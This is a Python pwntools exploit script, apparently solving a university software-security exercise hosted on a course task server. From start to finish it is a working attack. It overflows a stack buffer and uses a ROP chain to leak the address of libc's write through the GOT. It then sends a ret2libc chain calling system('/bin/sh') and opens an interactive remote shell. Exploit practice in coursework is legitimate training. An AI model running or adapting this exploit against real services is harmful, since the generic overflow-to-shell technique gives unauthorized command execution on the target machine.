#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33311)
#conn = pwn.process([exe.path])

#pwn.gdb.attach(conn)

# start here

# got via: ropper --file ./vuln_patched
address_g1 = 0x0000000000401069 # pop rdi; ret;
address_g2 = 0x000000000040106b # pop rsi; ret; 
address_of_write_in_main = 0x40106D # write

got_address_write = 0x0000000000403FE0 

rop_chain = [
    b'A'*0x28,
    pwn.p64(address_g1),
    pwn.p64(0x1),
    pwn.p64(address_g2),
    pwn.p64(got_address_write),
    pwn.p64(address_of_write_in_main)
]

rop_chain = b''.join(gadget for gadget in rop_chain)


conn.recvline(b'Hello, what\'s your name?')

conn.sendline(rop_chain)
pointer_to_libc_write = pwn.unpack(conn.recv(numb=8))

base_address_libc = pointer_to_libc_write - libc.symbols['write']
print(f'address of write = {hex(pointer_to_libc_write)}')
print(f'base address of libc = {hex(base_address_libc)}')

# now we are back at write and can overrite the stack again!

address_system = base_address_libc + libc.symbols['system']
address_string_bin_sh = base_address_libc + next(libc.search(b'/bin/sh\x00'))


libc.address = base_address_libc
rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])


payload = b'A'*(0x28) + rop.chain()

#conn.sendline(b'A'*8 + b'B'*8 + b'C'*8 + b'D'*8 + b'E'*8 + b'F'*8 + b'G'*8 + b'H'*8 + b'I'*8 + b'J'*8 + b'K'*8 + b'L'*8 + b'M'*8)
conn.sendline(payload)

conn.interactive()
exit()
